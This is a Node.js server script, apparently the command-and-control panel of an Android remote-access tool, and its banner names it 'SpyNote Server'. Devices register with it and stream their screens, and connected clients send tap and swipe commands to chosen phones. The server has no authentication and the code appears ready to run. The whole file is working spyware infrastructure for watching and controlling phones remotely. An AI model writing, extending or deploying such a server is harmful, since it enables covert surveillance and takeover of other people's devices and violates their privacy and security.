const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 10000,
    pingInterval: 5000,
    maxHttpBufferSize: 100 * 1024 * 1024
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const devices = new Map();
const deviceSockets = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        io.emit('devices-update', Array.from(devices.entries()));
        console.log("✅ Device registered:", deviceId);
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id 
            });
            deviceSockets.set(deviceId, socket.id);
            socket.join(deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
            console.log("📱 Device registered:", deviceId, "Socket:", socket.id);
        }
    });

    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        console.log('📺 Frame from:', deviceId);
        
        if (devices.has(deviceId)) {
            socket.broadcast.emit('screen-update', {
                deviceId,
                data: data.data,
                width: data.width,
                height: data.height,
                timestamp: data.timestamp
            });
        }
    });

    // 🔥 FIXED CONTROL - अब PERFECT काम करेगा
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        console.log('🎮 CONTROL ->', deviceId, ':', action, {x,y,startX,startY,endX,endY});
        
        if (devices.has(deviceId)) {
            const targetSocketId = deviceSockets.get(deviceId);
            if (targetSocketId) {
                // ✅ Method 1: Send to specific socket
                io.to(targetSocketId).emit('control', {
                    action, 
                    x: parseFloat(x) || 0, 
                    y: parseFloat(y) || 0,
                    startX: parseFloat(startX) || 0, 
                    startY: parseFloat(startY) || 0,
                    endX: parseFloat(endX) || 0, 
                    endY: parseFloat(endY) || 0
                });
                
                // ✅ Method 2: Also send to room (backup)
                io.to(deviceId).emit('control', {
                    action, 
                    x: parseFloat(x) || 0, 
                    y: parseFloat(y) || 0,
                    startX: parseFloat(startX) || 0, 
                    startY: parseFloat(startY) || 0,
                    endX: parseFloat(endX) || 0, 
                    endY: parseFloat(endY) || 0
                });
                
                console.log('✅ Control sent to:', deviceId, 'Socket:', targetSocketId);
            } else {
                console.log('⚠️ Device socket not found:', deviceId);
            }
        } else {
            console.log('❌ Device not found:', deviceId);
        }
    });

    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                deviceSockets.delete(deviceId);
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device disconnected:', deviceId);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
    console.log(`📱 Multi-device + FULL CONTROL ready!`);
});
